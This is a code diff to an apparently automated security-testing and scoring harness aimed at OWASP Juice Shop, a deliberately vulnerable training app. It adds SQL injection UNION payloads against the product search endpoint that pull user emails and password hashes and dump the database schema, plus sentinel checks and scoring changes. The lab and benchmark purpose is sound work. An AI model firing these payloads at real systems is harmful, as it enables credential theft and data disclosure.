@@ -51,6 +51,8 @@ if TYPE_CHECKING:
     from reachagent.oracles.base import OracleVerdict
 
 _HTTP_TIMEOUT = 15.0
+_UNION_USERS_SENTINEL = "admin@juice-sh.op"
+_UNION_SCHEMA_SENTINEL = "CREATE TABLE `Users`"
 
 
 # ---------------------------------------------------------------------------
@@ -424,7 +426,8 @@ def _confirm_structural(
     check_type: str,
     baseline_status: int,
     probe_status: int,
-    sentinel: str,
+    sentinel: str = "",
+    union_sentinel: str = "",
     probe_fire_ref: str,
     evidence_ref: str,
 ) -> bool:
@@ -437,6 +440,7 @@ def _confirm_structural(
             "baseline_status": baseline_status,
             "probe_status": probe_status,
             "sentinel": sentinel,
+            "union_sentinel": union_sentinel,
             "probe_fire_ref": probe_fire_ref,
             "evidence_ref": evidence_ref,
         },
@@ -490,14 +494,15 @@ def _confirm_structural_headers(
 
 
 def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[ChallengeClaim]:
-    """Confirm only the three target-specific SQLi login auth-bypass claims.
+    """Confirm SQLi claims only through deterministic, challenge-specific evidence.
 
-    The product-search endpoint is deliberately not credited: generic response
-    divergence or a database error does not prove UNION extraction or schema
-    disclosure for a specific tracker challenge.
+    Login claims use the differential auth-bypass oracle. Product-search UNION
+    claims use the structural oracle with extraction-only sentinels: a seeded user
+    email proves user extraction, while the exact SQLite artifact
+    "CREATE TABLE `Users`" proves schema disclosure. Generic response divergence
+    and database errors do not earn either claim.
 
-    Returns typed claims only after the differential auth-bypass oracle confirms
-    refused-to-granted behavior for each login probe.
+    Returns typed claims only after a Validator oracle confirms each probe.
     """
     shared = _SharedState()
     sess = _session_as(target, token, shared)
@@ -540,12 +545,46 @@ def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[ChallengeCla
             }[ref]
             confirmed.add(ChallengeClaim(claim_key, "sqli", ref))
 
-    # The search endpoint is intentionally not credited here.  A generic
-    # response-length/status divergence (including an empty search result) does
-    # not prove UNION extraction or schema disclosure, and the current
-    # error-based probe is not an exact challenge attribution.  Login
-    # auth-bypass claims above are the only target-specific SQLi claims this
-    # API-only runner can defend.
+    # --- UNION extraction on read-only product search ---
+    # Baseline is fetched for the same endpoint, but only the probe body can
+    # satisfy the extraction oracle. Product names/descriptions never satisfy
+    # either exact sentinel.
+    search_path = "/rest/products/search"
+    search_baseline = _fire_query(mcp, sess, "anon", search_path, "q", "qwert")
+    union_probes = (
+        (
+            "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
+            "unionSqlInjectionChallenge",
+            "sqli/search-union-users",
+            _UNION_USERS_SENTINEL,
+        ),
+        (
+            "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
+            "dbSchemaChallenge",
+            "sqli/search-union-schema",
+            _UNION_SCHEMA_SENTINEL,
+        ),
+    )
+    for payload, challenge_key, ref, sentinel in union_probes:
+        probe = _fire_query(mcp, sess, "anon", search_path, "q", payload)
+        if _confirm_structural(
+            mcp,
+            vuln_class="sqli",
+            check_type="union_extraction",
+            baseline_status=int(str(search_baseline.get("status_code", 0))),
+            probe_status=int(str(probe.get("status_code", 0))),
+            union_sentinel=sentinel,
+            probe_fire_ref=str(probe["fire_ref"]),
+            evidence_ref=ref,
+        ):
+            confirmed.add(
+                ChallengeClaim(
+                    challenge_key,
+                    "sqli",
+                    f"{ref}; sentinel={sentinel}",
+                )
+            )
+
     return confirmed
 
 
@@ -824,19 +863,25 @@ def score_run(
             continue
         solved_after = bool(ch_info["solved"])
         newly_solved = solved_after and not bool(before.get(ch_key, {}).get("solved", False))
-        matched_claim = any(
-            claim_scope_class(
-                claim.vuln_class,
-                claim.challenge_key,
-                claim.scope_class,
-            )
-            == scope_class
-            for claim in typed_claims
-            if claim.challenge_key == ch_key
+        matched_claim = next(
+            (
+                claim
+                for claim in typed_claims
+                if claim.challenge_key == ch_key
+                and claim_scope_class(
+                    claim.vuln_class,
+                    claim.challenge_key,
+                    claim.scope_class,
+                )
+                == scope_class
+            ),
+            None,
         )
         reason = "tracker remains unsolved"
-        if newly_solved and matched_claim:
-            reason = "tracker solved after matching oracle claim"
+        if newly_solved and matched_claim is not None:
+            reason = (
+                f"tracker solved after matching oracle claim; evidence={matched_claim.evidence_ref}"
+            )
         elif newly_solved:
             reason = "tracker solved without matching oracle claim"
         elif solved_after:
@@ -849,7 +894,7 @@ def score_run(
             ChallengeResult(
                 vuln_class=scope_class,
                 challenge_key=ch_key,
-                confirmed=(newly_solved and matched_claim)
+                confirmed=(newly_solved and matched_claim is not None)
                 if (typed_mode or strict_scope)
                 else newly_solved,
                 tracker_solved=solved_after,
